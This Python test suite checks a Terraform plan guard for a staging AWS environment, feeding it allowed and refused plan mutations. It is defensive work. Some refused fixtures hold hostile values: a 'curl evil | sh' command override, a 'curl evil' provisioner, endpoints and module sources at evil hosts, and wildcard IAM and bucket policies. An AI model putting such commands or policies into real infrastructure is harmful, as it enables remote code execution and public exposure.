#!/usr/bin/env python3
"""Tests for plan_check.py. No dependencies, no network, no AWS.   python3 infra/scripts/test_plan_check.py

The fixtures are real: fixtures/staging-plan.json is a no-change plan of staging, and staging-variants.json holds what real plans
changed with a variable set (scrub_plan.py removed the account id and addresses). Each case changes a copy, then asks for a verdict.
Then every guard is switched off in turn: a guard that no test notices missing fails the run.
"""
import copy
import os
import json
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import plan_check as pc  # noqa: E402

BASE = json.loads((HERE / "fixtures/staging-plan.json").read_text())
BACKEND = json.loads((HERE / "fixtures/backend.json").read_text())
VARIANTS = json.loads((HERE / "fixtures/staging-variants.json").read_text())
ACCOUNT = "123456789012"
ENV = "module.env."
API_TD = ENV + 'aws_ecs_task_definition.service["api"]'
VOICE_TD = ENV + 'aws_ecs_task_definition.service["voice"]'
WORKER_TD = ENV + 'aws_ecs_task_definition.service["worker"]'
WORKER_SERVICE = ENV + 'aws_ecs_service.service["worker"]'
API_SERVICE = ENV + 'aws_ecs_service.service["api"]'
JOBS = ENV + "aws_sqs_queue.jobs"
ALARM = ENV + "aws_cloudwatch_metric_alarm.db_cpu"
DB = ENV + "aws_db_instance.main"
MEDIA = ENV + "aws_s3_bucket.media"
SCHEDULE = ENV + 'aws_scheduler_schedule.task["dish.sweep"]'
LOGS = ENV + 'aws_cloudwatch_log_group.service["api"]'
CORS_PRIVATE = ENV + 'aws_s3_bucket_cors_configuration.private[0]'
CORS_MEDIA = ENV + "aws_s3_bucket_cors_configuration.media"
LIFECYCLE = ENV + "aws_s3_bucket_lifecycle_configuration.media"
FUNCTION = "module.web.aws_cloudfront_function.rewrite"
TASK_POLICY = ENV + 'aws_iam_role_policy.task["api"]'
DEPLOY_ROLE = ENV + "aws_iam_role.deploy"
EXEC_ATTACH = ENV + 'aws_iam_role_policy_attachment.execution_base["api"]'
BUCKET_POLICY = ENV + "aws_s3_bucket_policy.media"
PAB = ENV + "aws_s3_bucket_public_access_block.private"
DISTRIBUTION = "module.web.aws_cloudfront_distribution.web"
LISTENER = ENV + "aws_lb_listener.main"
LB = ENV + "aws_lb.main"
ROUTE = ENV + "aws_route_table_association.private[0]"
INGRESS = ENV + 'aws_vpc_security_group_ingress_rule.service_from_alb["api"]'
SUBSCRIPTION = ENV + "aws_sns_topic_subscription.email"


def fresh():
    return copy.deepcopy(BASE)


def find(plan, address):
    return next(r for r in plan["resource_changes"] if r["address"] == address)


def variant(name):
    plan = fresh()
    plan["variables"] = VARIANTS[name]["variables"]
    for change in copy.deepcopy(VARIANTS[name]["changes"]):
        if any(r["address"] == change["address"] for r in plan["resource_changes"]):
            plan["resource_changes"] = [change if r["address"] == change["address"] else r for r in plan["resource_changes"]]
        else:
            plan["resource_changes"].append(change)
    return plan


def update(plan, address, **values):
    """An in-place change of the fields given, as a real update looks."""
    r = find(plan, address)
    r["change"]["actions"] = ["update"]
    r["change"]["after"] = {**r["change"]["before"], **values}
    return r


def act(plan, address, *actions):
    r = find(plan, address)
    r["change"]["actions"] = list(actions)
    if actions == ("delete",):
        r["change"]["after"] = None
    return r


def add(plan, type_, name, after, unknown=None, module=ENV):
    r = {
        "address": f"{module}{type_}.{name}",
        "module_address": module.rstrip("."),
        "mode": "managed",
        "type": type_,
        "name": name,
        "provider_name": pc.PROVIDER,
        "change": {"actions": ["create"], "before": None, "after": after, "after_unknown": unknown or {"id": True, "arn": True}},
    }
    plan["resource_changes"].append(r)
    return r


def edit_container(plan, address, fn):
    """Replaces a task definition with a real-looking new revision, after fn changes its one container."""
    r = find(plan, address)
    r["change"]["actions"] = ["delete", "create"]
    r["change"]["after"] = copy.deepcopy(r["change"]["before"])
    r["change"]["after_unknown"] = {"arn": True, "id": True, "revision": True}
    defs = json.loads(r["change"]["after"]["container_definitions"])
    fn(defs[0])
    r["change"]["after"]["container_definitions"] = json.dumps(defs)
    return r


def set_env(container, name, value):
    container["environment"] = [e for e in container["environment"] if e["name"] != name]
    if value is not None:
        container["environment"].append({"name": name, "value": value})


def add_secret(container, name, value_from):
    container["secrets"] = container.get("secrets", []) + [{"name": name, "valueFrom": value_from}]


def staging_secret(name):
    return f"arn:aws:secretsmanager:us-west-2:{ACCOUNT}:secret:homecookd/staging/{name}-abc123"


def module(plan, name="env"):
    return plan["configuration"]["root_module"]["module_calls"][name]


def many(plan, type_, count, after):
    for i in range(count):
        add(plan, type_, f"n{i}", {**after, next(iter(after)): f"{after[next(iter(after))]}{i}"})


# Allowed: each is a real change, or a real resource changed the way a merge would.
def allowed_new_alarm(p):
    r = next(c for c in VARIANTS["voice_one"]["changes"] if c["type"] == "aws_cloudwatch_metric_alarm")
    r = copy.deepcopy(r)
    r["address"] += "_copy"
    r["change"]["after"]["alarm_name"] = "homecookd-staging-another"
    p["resource_changes"].append(r)


def allowed_new_queue(p):
    add(p, "aws_sqs_queue", "more", {"name": "homecookd-staging-more", "visibility_timeout_seconds": 60, "region": "us-west-2"},
        {"arn": True, "id": True, "policy": True, "url": True, "tags_all": {}})


def allowed_new_secret_name(p):
    add(p, "aws_secretsmanager_secret", "more", {"name": "homecookd/staging/SOMETHING", "region": "us-west-2"})


def allowed_cors(p):
    r = find(p, CORS_PRIVATE)
    rule = copy.deepcopy(r["change"]["before"]["cors_rule"])
    rule[0]["allowed_origins"] = rule[0]["allowed_origins"] + ["https://example.com"]
    update(p, CORS_PRIVATE, cors_rule=rule)


ALLOWED = {
    "the real no-change plan": lambda p: None,
    "real: budget variable replaces the api's task definition": lambda p: p.update(variant("budget")),
    "real: one voice task, and its alarm": lambda p: p.update(variant("voice_one")),
    "real: api at zero tasks, its alarm goes": lambda p: p.update(variant("api_zero")),
    "a new alarm": allowed_new_alarm,
    "a new queue": allowed_new_queue,
    "a queue setting": lambda p: update(p, JOBS, visibility_timeout_seconds=9000),
    "a new secret's name, no value": allowed_new_secret_name,
    "a schedule's timing": lambda p: update(p, SCHEDULE, schedule_expression="rate(2 hours)"),
    "log retention": lambda p: update(p, LOGS, retention_in_days=14),
    "one more CORS origin": allowed_cors,
    "lifecycle days": lambda p: update(p, LIFECYCLE, rule=[{"id": "x"}]),
    "the website's rewrite function": lambda p: update(p, FUNCTION, code="// homecookd.app changed", etag="x"),
    "an env var": lambda p: edit_container(p, API_TD, lambda c: set_env(c, "LOG_LEVEL", "debug")),
    "just under the cost limit: 124 secret names at $0.40": lambda p: many(p, "aws_secretsmanager_secret", 124, {"name": "homecookd/staging/S"}),
}


# Refused: name -> (mutation, the guard that must say so)
def set_top(key, value):
    return lambda p: p.__setitem__(key, value)


def provider_expr(key, value):
    return lambda p: p["configuration"]["provider_config"]["aws"]["expressions"].__setitem__(key, value)


def config_block(p, **block):
    module(p)["module"]["resources"].append({"address": "x.y", "mode": "managed", "type": "aws_sqs_queue", "name": "y", "provider_config_key": "aws", **block})


def destroy_everything(p):
    for r in p["resource_changes"]:
        r["change"]["actions"] = ["delete"]
        r["change"]["after"] = None


def real_ai_by_variable(p):
    p["variables"]["real_ai"] = {"value": True}


def real_ai_as_text(p):
    p["variables"]["real_ai"] = {"value": "true"}


def public_new_ingress(p):
    add(p, "aws_vpc_security_group_ingress_rule", "open", {"cidr_ipv4": "0.0.0.0/0", "from_port": 5432, "to_port": 5432, "ip_protocol": "tcp"})


def worker_up(p):
    update(p, WORKER_SERVICE, desired_count=1)


def api_size_up(p):
    r = edit_container(p, API_TD, lambda c: None)
    r["change"]["after"]["cpu"] = "4096"
    r["change"]["after"]["memory"] = "8192"


def service_without_definition(p):
    worker_up(p)
    p["resource_changes"] = [r for r in p["resource_changes"] if r["address"] != WORKER_TD]


def service_size_unreadable(p):
    r = find(p, API_TD)
    r["change"]["after"] = {**r["change"]["after"], "cpu": "lots"}


def unknown_container(p):
    r = edit_container(p, API_TD, lambda c: None)
    del r["change"]["after"]["container_definitions"]
    r["change"]["after_unknown"]["container_definitions"] = True


def unknown_count(p):
    r = update(p, API_SERVICE)
    del r["change"]["after"]["desired_count"]
    r["change"]["after_unknown"] = {"desired_count": True}


def unknown_nested(p):
    r = update(p, SCHEDULE)
    r["change"]["after_unknown"] = {"target": [{"arn": True}]}


def set_terraform_data(p):
    add(p, "terraform_data", "run", {"input": None})


def null_resource(p):
    r = add(p, "null_resource", "run", {"triggers": None})
    r["provider_name"] = "registry.terraform.io/hashicorp/null"


def foreign_provider(p):
    find(p, JOBS)["provider_name"] = "registry.terraform.io/evil/aws"


def moved_resource(p):
    find(p, JOBS)["previous_address"] = ENV + "aws_sqs_queue.old"


def imported_resource(p):
    find(p, JOBS)["change"]["importing"] = {"id": "somewhere"}


def forgotten(p):
    find(p, JOBS)["change"]["actions"] = ["forget"]


def deposed(p):
    r = act(p, JOBS, "delete")
    r["deposed"] = "abc123"


def deferred_read(p):
    r = add(p, "aws_secretsmanager_secret_version", "read", {})
    r.update(mode="data")
    r["change"]["actions"] = ["read"]


def new_policy(p):
    r = find(p, TASK_POLICY)
    policy = json.loads(r["change"]["before"]["policy"])
    policy["Statement"].append({"Effect": "Allow", "Action": "*", "Resource": "*"})
    update(p, TASK_POLICY, policy=json.dumps(policy))


def narrower_policy(p):
    r = find(p, TASK_POLICY)
    policy = json.loads(r["change"]["before"]["policy"])
    policy["Statement"] = policy["Statement"][:1]
    update(p, TASK_POLICY, policy=json.dumps(policy))


def trust_change(p):
    update(p, DEPLOY_ROLE, assume_role_policy='{"Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}')


def new_role(p):
    add(p, "aws_iam_role", "more", {"name": "homecookd-staging-more", "assume_role_policy": "{}"})


def cors_wildcard(p):
    r = find(p, CORS_PRIVATE)
    rule = copy.deepcopy(r["change"]["before"]["cors_rule"])
    rule[0]["allowed_origins"] = ["*"]
    update(p, CORS_PRIVATE, cors_rule=rule)


def cors_wildcard_read_only(p):
    r = find(p, CORS_PRIVATE)
    rule = copy.deepcopy(r["change"]["before"]["cors_rule"])
    rule[0].update(allowed_origins=["*"], allowed_methods=["GET"])
    update(p, CORS_PRIVATE, cors_rule=rule)


def unreadable_container(p):
    edit_container(p, API_TD, lambda c: None)["change"]["after"]["container_definitions"] = "not json"


def cors_write(p):
    r = find(p, CORS_MEDIA)
    rule = copy.deepcopy(r["change"]["before"]["cors_rule"])
    rule[0]["allowed_methods"] = ["GET", "PUT"]
    update(p, CORS_MEDIA, cors_rule=rule)


def backend(**change):
    b = copy.deepcopy(BACKEND)
    b["backend"].update(change)
    return b


def backend_config(**change):
    b = copy.deepcopy(BACKEND)
    b["backend"]["config"].update(change)
    return b


REFUSED = {
    # Rule 1
    "deletes the database": (lambda p: act(p, DB, "delete"), "keeps_databases_and_buckets"),
    "replaces the database": (lambda p: act(p, DB, "delete", "create"), "keeps_databases_and_buckets"),
    "replaces the database, new one first": (lambda p: act(p, DB, "create", "delete"), "keeps_databases_and_buckets"),
    "deletes a bucket": (lambda p: act(p, MEDIA, "delete"), "keeps_databases_and_buckets"),
    "replaces a bucket": (lambda p: act(p, MEDIA, "delete", "create"), "keeps_databases_and_buckets"),
    "a destroy of everything": (destroy_everything, "keeps_databases_and_buckets"),
    # Rule 2
    "a queue named for production": (lambda p: update(p, JOBS, name="homecookd-production-jobs"), "named_for_staging"),
    "a name that only contains staging's": (lambda p: update(p, JOBS, name="x-homecookd-staging-jobs"), "named_for_staging"),
    "a service in another cluster": (lambda p: update(p, API_SERVICE, cluster=f"arn:aws:ecs:us-west-2:{ACCOUNT}:cluster/homecookd-production"), "named_for_staging"),
    "another region": (lambda p: update(p, JOBS, region="us-east-1"), "stays_in_region"),
    "an env var pointing at live Convex": (lambda p: edit_container(p, API_TD, lambda c: set_env(c, "CONVEX_URL", "https://grand-dragon-649.convex.cloud")), "no_live_names"),
    "an alarm that names production": (lambda p: update(p, ALARM, alarm_description="homecookd-production-db"), "no_live_names"),
    "an alarm telling another topic": (lambda p: update(p, ALARM, alarm_actions=[f"arn:aws:sns:us-west-2:{ACCOUNT}:someone-else"]), "arns_stay_in_staging"),
    "an alarm that terminates an instance": (lambda p: update(p, ALARM, alarm_actions=["arn:aws:automate:us-west-2:ec2:terminate"]), "arns_stay_in_staging"),
    "an ARN in another account": (lambda p: update(p, ALARM, alarm_actions=["arn:aws:sns:us-west-2:999999999999:homecookd-staging-alerts"]), "arns_stay_in_staging"),
    "a schedule into a network staging doesn't own": (lambda p: update(p, SCHEDULE, target=[{"network": "sg-0123456789abcdef0"}]), "resource_ids_are_staging"),
    "the environment module set to production": (lambda p: module(p)["expressions"]["environment"].update(constant_value="production"), "environment_name"),
    "a module from somewhere else": (lambda p: module(p).update(source="git::https://example.com/evil.git"), "module_sources"),
    "a third module": (lambda p: p["configuration"]["root_module"]["module_calls"].update(more={"source": "../../modules/env", "module": {}}), "module_sources"),
    "a module inside a module": (lambda p: module(p)["module"].update(module_calls={"x": {"source": "git::https://example.com"}}), "module_sources"),
    "a local backend": (lambda p: None, "backend_is_staging", backend(type="local", config={"path": "x"})),
    "a local backend with S3's settings": (lambda p: None, "backend_is_staging", backend(type="local")),
    "Terraform Cloud": (lambda p: None, "backend_is_staging", backend(type="cloud", config={"organization": "x"})),
    "production's state": (lambda p: None, "backend_is_staging", backend_config(key="production/terraform.tfstate")),
    "another bucket": (lambda p: None, "backend_is_staging", backend_config(bucket="someone-elses-bucket")),
    "locking off": (lambda p: None, "backend_is_staging", backend_config(use_lockfile=False)),
    "the backend assuming a role": (lambda p: None, "backend_is_staging", backend_config(assume_role={"role_arn": "x"})),
    "the backend pointing elsewhere": (lambda p: None, "backend_is_staging", backend_config(endpoints={"s3": "https://evil.example.com"})),
    "no record of the backend": (lambda p: None, "backend_is_staging", {}),
    "a changed provider source": (lambda p: p["configuration"]["provider_config"]["aws"].update(full_name="registry.terraform.io/evil/aws"), "provider_is_aws"),
    "a second provider": (lambda p: p["configuration"]["provider_config"].update(null={"name": "null", "full_name": "registry.terraform.io/hashicorp/null"}), "provider_is_aws"),
    "an aliased provider": (lambda p: p["configuration"]["provider_config"].update({"aws.east": {"name": "aws", "alias": "east", "full_name": pc.PROVIDER}}), "provider_is_aws"),
    "the provider assuming a role": (provider_expr("assume_role", [{"role_arn": {"constant_value": "x"}}]), "provider_is_aws"),
    "the provider pointing elsewhere": (provider_expr("endpoints", [{"s3": {"constant_value": "https://evil.example.com"}}]), "provider_is_aws"),
    "the provider in another region": (provider_expr("region", {"constant_value": "us-east-1"}), "provider_is_aws"),
    "default tags for production": (provider_expr("default_tags", [{"tags": {"constant_value": {"Environment": "production"}}}]), "provider_is_aws"),
    "a resource on a foreign provider": (foreign_provider, "resource_providers"),
    # Rule 3
    "changes a role's trust": (trust_change, "iam_is_never_automatic"),
    "a new role": (new_role, "iam_is_never_automatic"),
    "a wider policy": (new_policy, "iam_is_never_automatic"),
    "a narrower policy too: it can't tell without classifying, and the role can't write it": (narrower_policy, "iam_is_never_automatic"),
    "an attached managed policy": (lambda p: update(p, EXEC_ATTACH, policy_arn="arn:aws:iam::aws:policy/AdministratorAccess"), "iam_is_never_automatic"),
    "an IAM user": (lambda p: add(p, "aws_iam_user", "x", {"name": "x"}), "known_types"),
    "an access key": (lambda p: add(p, "aws_iam_access_key", "x", {"user": "x"}), "known_types"),
    "a new OIDC login": (lambda p: add(p, "aws_iam_openid_connect_provider", "x", {"url": "x"}), "known_types"),
    # Rule 4: real models
    "real_ai true": (real_ai_by_variable, "real_ai_stays_off"),
    "real_ai true as text, the way -var sends it": (real_ai_as_text, "real_ai_stays_off"),
    "real: the plan real_ai=true makes, fake flag": (lambda p: p.update(variant("real_ai")), "fake_flags_stay_on"),
    "real: the plan real_ai=true makes, secrets": (lambda p: p.update(variant("real_ai")), "task_secrets_are_listed"),
    "real: the plan real_ai=true makes, the role that reads them": (lambda p: p.update(variant("real_ai")), "iam_is_never_automatic"),
    "DISH_FAKE_AI removed, real_ai still false": (lambda p: edit_container(p, API_TD, lambda c: set_env(c, "DISH_FAKE_AI", None)), "fake_flags_stay_on"),
    "DISH_FAKE_AI set to 0": (lambda p: edit_container(p, API_TD, lambda c: set_env(c, "DISH_FAKE_AI", "0")), "fake_flags_stay_on"),
    "VOICE_FAKE_SPEECH off": (lambda p: edit_container(p, VOICE_TD, lambda c: set_env(c, "VOICE_FAKE_SPEECH", "0")), "fake_flags_stay_on"),
    "VOICE_STUB off": (lambda p: edit_container(p, VOICE_TD, lambda c: set_env(c, "VOICE_STUB", None)), "fake_flags_stay_on"),
    "DEPLOY_ENV set to production": (lambda p: edit_container(p, API_TD, lambda c: set_env(c, "DEPLOY_ENV", "production")), "fake_flags_stay_on"),
    "a service this check doesn't know": (lambda p: edit_container(p, API_TD, lambda c: None)["change"]["after"].update(family="homecookd-staging-new"), "fake_flags_stay_on"),
    "the real key named in the secrets list": (lambda p: edit_container(p, API_TD, lambda c: add_secret(c, "ANTHROPIC_API_KEY", staging_secret("ANTHROPIC_API_KEY"))), "task_secrets_are_listed"),
    "the real key under an allowed name": (lambda p: edit_container(p, API_TD, lambda c: (c["secrets"].clear(), add_secret(c, "RATE_LIMIT_SALT", staging_secret("ANTHROPIC_API_KEY")))), "task_secrets_are_listed"),
    "another secret as the database's": (lambda p: edit_container(p, API_TD, lambda c: (c["secrets"].clear(), add_secret(c, "DB_CREDENTIALS", staging_secret("CARTESIA_API_KEY")))), "task_secrets_are_listed"),
    "a real key in plain env": (lambda p: edit_container(p, API_TD, lambda c: set_env(c, "ANTHROPIC_API_KEY", "typed-in")), "no_keys_in_plain_env"),
    "voice's placeholder key swapped": (lambda p: edit_container(p, VOICE_TD, lambda c: set_env(c, "CARTESIA_API_KEY", "typed-in")), "no_keys_in_plain_env"),
    "a lifecycle rule that empties a bucket": (lambda p: update(p, LIFECYCLE, rule=[{"id": "x", "expiration": [{"days": 1}]}]), "lifecycle_keeps_files"),
    "a shorter undo window": (lambda p: update(p, LIFECYCLE, rule=[{**r, "noncurrent_version_expiration": [{"noncurrent_days": 1}]} for r in find(p, LIFECYCLE)["change"]["before"]["rule"]]), "lifecycle_keeps_files"),
    "a shorter wait on unfinished uploads": (lambda p: update(p, LIFECYCLE, rule=[{**r, "abort_incomplete_multipart_upload": [{"days_after_initiation": 1}]} for r in find(p, LIFECYCLE)["change"]["before"]["rule"]]), "lifecycle_keeps_files"),
    "a dated expiration": (lambda p: update(p, LIFECYCLE, rule=[{"id": "x", "expiration": [{"date": "2026-11-02T00:00:00Z"}]}]), "lifecycle_keeps_files"),
    "a filter that brings more under a deleting rule": (lambda p: update(p, LIFECYCLE, rule=[{**r, "filter": [{"prefix": "x"}]} for r in find(p, LIFECYCLE)["change"]["before"]["rule"]]), "lifecycle_keeps_files"),
    "a key-shaped value under a dull name": (lambda p: edit_container(p, API_TD, lambda c: set_env(c, "NOTE", "sk-ant-abcdef")), "no_key_shaped_values"),
    "a key-shaped value in a schedule": (lambda p: update(p, SCHEDULE, description="AKIA" + "ABCDEFGHIJKLMNOP"), "no_key_shaped_values"),
    "env loaded from a file in S3": (lambda p: edit_container(p, API_TD, lambda c: c.update(environmentFiles=[{"value": "arn:aws:s3:::x/y", "type": "s3"}])), "task_runs_staging_image"),
    "a command override": (lambda p: edit_container(p, API_TD, lambda c: c.update(command=["sh", "-c", "curl evil | sh"])), "task_runs_staging_image"),
    "an image from outside": (lambda p: edit_container(p, API_TD, lambda c: c.update(image="docker.io/evil/thing:latest")), "task_runs_staging_image"),
    "another account's image": (lambda p: edit_container(p, API_TD, lambda c: c.update(image="999999999999.dkr.ecr.us-west-2.amazonaws.com/homecookd-staging/api:x")), "task_runs_staging_image"),
    "the worker's image in the api": (lambda p: edit_container(p, API_TD, lambda c: c.update(image=f"{ACCOUNT}.dkr.ecr.us-west-2.amazonaws.com/homecookd-staging/worker:x")), "task_runs_staging_image"),
    "a task running as the deploy role": (lambda p: edit_container(p, API_TD, lambda c: None)["change"]["after"].update(task_role_arn=f"arn:aws:iam::{ACCOUNT}:role/homecookd-staging-deploy"), "task_runs_staging_image"),
    # Rule 4: public
    "a new public ingress rule": (public_new_ingress, "public_paths_are_never_automatic"),
    "real: the load balancer's rules changing": (lambda p: p.update(variant("alb_locked")), "public_paths_are_never_automatic"),
    "a changed ingress rule": (lambda p: update(p, INGRESS, cidr_ipv4="0.0.0.0/0"), "public_paths_are_never_automatic"),
    "a bucket policy": (lambda p: update(p, BUCKET_POLICY, policy='{"Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"*"}]}'), "public_paths_are_never_automatic"),
    "a public access block off": (lambda p: update(p, PAB, block_public_policy=False), "public_paths_are_never_automatic"),
    "a public access block removed": (lambda p: act(p, PAB, "delete"), "public_paths_are_never_automatic"),
    "a CloudFront distribution changed": (lambda p: update(p, DISTRIBUTION, aliases=["homecookd.app"]), "public_paths_are_never_automatic"),
    "a new CloudFront distribution": (lambda p: add(p, "aws_cloudfront_distribution", "more", {"enabled": True}, module="module.web."), "public_paths_are_never_automatic"),
    "a load balancer listener": (lambda p: update(p, LISTENER, port=8080), "public_paths_are_never_automatic"),
    "a new load balancer": (lambda p: add(p, "aws_lb", "more", {"internal": False}), "public_paths_are_never_automatic"),
    "a private subnet moved to the public route table": (lambda p: update(p, ROUTE, route_table_id="rtb-public"), "public_paths_are_never_automatic"),
    "a public bucket website type": (lambda p: add(p, "aws_s3_bucket_website_configuration", "x", {"bucket": "homecookd-staging-media"}), "known_types"),
    "a bucket ACL type": (lambda p: add(p, "aws_s3_bucket_acl", "x", {"bucket": "homecookd-staging-media", "acl": "public-read"}), "known_types"),
    "a Lambda URL": (lambda p: add(p, "aws_lambda_function_url", "x", {"authorization_type": "NONE"}), "known_types"),
    "the old style security group rule": (lambda p: add(p, "aws_security_group_rule", "x", {"type": "ingress", "cidr_blocks": ["0.0.0.0/0"]}), "known_types"),
    "a service getting a public IP": (lambda p: update(p, API_SERVICE, network_configuration=[{"assign_public_ip": True}]), "service_only_changes_count"),
    "a service moved to another load balancer target": (lambda p: update(p, API_SERVICE, load_balancer=[{"container_port": 1}]), "service_only_changes_count"),
    "CORS open to every site": (cors_wildcard, "cors_stays_closed"),
    "CORS open to every site, reading only": (cors_wildcard_read_only, "cors_stays_closed"),
    "CORS letting every site write": (cors_write, "cors_stays_closed"),
    "a queue policy": (lambda p: update(p, JOBS, policy='{"Statement":[{"Principal":"*"}]}'), "forbidden_settings"),
    "a queue policy still unknown, seen in the config": (lambda p: (update(p, JOBS), find(p, JOBS)["change"].update(after_unknown={"policy": True}), [b["expressions"].update(policy={"references": ["x"]}) for b in module(p)["module"]["resources"] if b["address"] == "aws_sqs_queue.jobs"]), "forbidden_settings"),
    "a secret shared by policy": (lambda p: add(p, "aws_secretsmanager_secret", "more", {"name": "homecookd/staging/X", "policy": '{"Statement":[]}'}), "forbidden_settings"),
    "a secret copied to another region": (lambda p: add(p, "aws_secretsmanager_secret", "more", {"name": "homecookd/staging/X", "replica": [{"region": "eu-west-1"}]}), "forbidden_settings"),
    # Rule 4: secret values
    "a secret's value": (lambda p: add(p, "aws_secretsmanager_secret_version", "x", {"secret_string": "x"}), "no_secret_values"),
    "a write-only secret value": (lambda p: add(p, "aws_secretsmanager_secret_version", "x", {"secret_string": None}, {"secret_string_wo": True}), "no_secret_values"),
    "an SSM parameter": (lambda p: add(p, "aws_ssm_parameter", "x", {"name": "x", "value": "x"}), "no_secret_values"),
    "a database password": (lambda p: update(p, DB, password="typed-in"), "no_secret_values"),
    "a database password unknown until apply": (lambda p: find(p, DB)["change"].update(update(p, DB)["change"], after_unknown={"password": True}), "no_secret_values"),
    # Rule 5
    "the worker at one task, about $85": (worker_up, "cost_is_small"),
    "a bigger task under a running service": (api_size_up, "cost_is_small"),
    "at the limit: 125 secret names at $0.40": (lambda p: many(p, "aws_secretsmanager_secret", 125, {"name": "homecookd/staging/S"}), "cost_is_small"),
    "a service with no task definition to price": (service_without_definition, "cost_is_small"),
    "a task size that isn't a number": (lambda p: (update(p, API_SERVICE, desired_count=2), service_size_unreadable(p)), "cost_is_small"),
    "an unknown type can't be estimated": (lambda p: add(p, "aws_instance", "x", {"instance_type": "p5.48xlarge"}), "known_types"),
    # Not understood
    "a container definition it can't read: a crash refuses": (unreadable_container, "fake_flags_stay_on"),
    "an action in the plan":(set_top("action_invocations", [{"address": "action.aws_lambda_invoke.x"}]), "plan_shape"),
    "a plan part it hasn't seen": (set_top("something_new", {}), "plan_shape"),
    "another plan format": (set_top("format_version", "2.0"), "plan_shape"),
    "another Terraform": (set_top("terraform_version", "1.18.0"), "plan_shape"),
    "a plan with errors": (set_top("errored", True), "plan_shape"),
    "an incomplete plan": (set_top("complete", False), "plan_shape"),
    "a failing check": (lambda p: p["checks"][0].update(status="fail"), "checks_pass"),
    "action blocks in the config": (lambda p: p["configuration"]["root_module"].update(actions=[{"address": "x"}]), "known_config_blocks"),
    "action blocks in a module": (lambda p: module(p)["module"].update(actions=[{"address": "x"}]), "known_config_blocks"),
    "a local-exec provisioner on an allowed type": (lambda p: config_block(p, provisioners=[{"type": "local-exec", "expressions": {"command": {"constant_value": "curl evil"}}}]), "no_provisioners"),
    "terraform_data": (set_terraform_data, "no_command_runners"),
    "null_resource": (null_resource, "no_command_runners"),
    "an external data source": (lambda p: config_block(p, mode="data", type="external"), "only_known_data_sources"),
    "a Lambda called from a data source": (lambda p: config_block(p, mode="data", type="aws_lambda_invocation"), "only_known_data_sources"),
    "a secret's value read through a data source": (lambda p: config_block(p, mode="data", type="aws_secretsmanager_secret_version"), "only_known_data_sources"),
    "an ephemeral block, if it ever shows": (lambda p: config_block(p, mode="ephemeral", type="aws_secretsmanager_secret_version"), "only_known_data_sources"),
    "a data read left for apply": (deferred_read, "no_deferred_reads"),
    "a moved block": (moved_resource, "no_moved"),
    "an import": (imported_resource, "no_imports"),
    "a removed block: Terraform forgets a resource": (forgotten, "known_actions"),
    "a leftover from a failed replace": (deposed, "known_actions"),
    "an unknown type": (lambda p: add(p, "aws_opensearch_domain", "x", {"domain_name": "x"}), "known_types"),
    "a new queue whose name can't be seen": (lambda p: add(p, "aws_sqs_queue", "x", {}, {"name": True}), "fields_that_matter_are_known"),
    "a door type's action": (lambda p: act(p, SUBSCRIPTION, "delete"), "held_types_are_never_automatic"),
    "where alerts go changes": (lambda p: update(p, SUBSCRIPTION, endpoint="someone@example.com"), "held_types_are_never_automatic"),
    "the database's size": (lambda p: update(p, DB, instance_class="db.r6g.4xlarge"), "held_types_are_never_automatic"),
    "a type whose delete isn't allowed": (lambda p: act(p, JOBS, "delete"), "auto_actions"),
    "a secret's update isn't allowed": (lambda p: update(p, ENV + 'aws_secretsmanager_secret.app["SENTRY_DSN_API"]', description="x"), "auto_actions"),
    "the website function's replace isn't allowed": (lambda p: act(p, FUNCTION, "delete", "create"), "auto_actions"),
    "a container definition unknown until apply": (unknown_container, "fields_that_matter_are_known"),
    "a count unknown until apply": (unknown_count, "fields_that_matter_are_known"),
    "a schedule target unknown until apply": (unknown_nested, "fields_that_matter_are_known"),
}


FILE_CASES = {
    "a moved block": ("main.tf", 'moved {\n  from = a.b\n  to = a.c\n}\n', "forbidden_blocks"),
    "a removed block": ("main.tf", "removed {\n  from = a.b\n}\n", "forbidden_blocks"),
    "an import block": ("main.tf", "import {\n  to = a.b\n  id = 1\n}\n", "forbidden_blocks"),
    "an ephemeral block": ("main.tf", 'ephemeral "aws_secretsmanager_secret_version" "x" {\n}\n', "forbidden_blocks"),
    "an action block": ("main.tf", 'action "aws_lambda_invoke" "x" {\n}\n', "forbidden_blocks"),
    "a check block": ("main.tf", 'check "x" {\n  data "aws_x" "y" {}\n}\n', "forbidden_blocks"),
    "a provisioner": ("main.tf", 'resource "a" "b" {\n  provisioner "local-exec" {\n  }\n}\n', "forbidden_blocks"),
    "a config file in JSON": ("main.tf.json", "{}", "forbidden_files"),
    "a tfvars file": ("real.auto.tfvars", "real_ai = true\n", "forbidden_files"),
    "an override": ("backend_override.tf", "", "forbidden_files"),
    "a plain override.tf": ("override.tf", "", "forbidden_files"),
    "a local plugin folder": ("terraform.d/plugins/x", "", "forbidden_files"),
    "a committed .terraform folder": (".terraform/providers/x", "", "forbidden_files"),
    "a second provider in the lock file": (".terraform.lock.hcl", 'provider "registry.terraform.io/hashicorp/aws" {\n}\nprovider "registry.terraform.io/hashicorp/external" {\n}\n', "lock_file_providers"),
    "no lock file": (None, "", "lock_file_providers"),
}
GOOD_LOCK = 'provider "registry.terraform.io/hashicorp/aws" {\n}\n'


def run_plan_case(mutate, backend_record, guards):
    plan = fresh()
    mutate(plan)
    return pc.check_plan(plan, backend_record, guards)


def run_file_case(name, content, guards):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        if name != ".terraform.lock.hcl" and name is not None:
            (root / ".terraform.lock.hcl").write_text(GOOD_LOCK)
        if name:
            (root / name).parent.mkdir(parents=True, exist_ok=True)
            (root / name).write_text(content)
        return pc.check_files([str(root)], guards)


def failures(plan_guards=None, file_guards=None):
    """Every case whose verdict is wrong under these guards, as (case name, was it let through entirely)."""
    wrong = []
    for name, mutate in ALLOWED.items():
        reasons = run_plan_case(mutate, BACKEND, plan_guards)
        if reasons:
            wrong.append((f"should be allowed: {name}: {reasons[0].guard}: {reasons[0].text}", False))
    for name, case in REFUSED.items():
        mutate, expected = case[0], case[1]
        reasons = run_plan_case(mutate, case[2] if len(case) > 2 else BACKEND, plan_guards)
        if expected not in {r.guard for r in reasons}:
            wrong.append((f"not caught by {expected}: {name}", not reasons))
    for name, (filename, content, expected) in FILE_CASES.items():
        reasons = run_file_case(filename, content, file_guards)
        if expected not in {r.guard for r in reasons}:
            wrong.append((f"not caught by {expected}: files: {name}", not reasons))
    return wrong


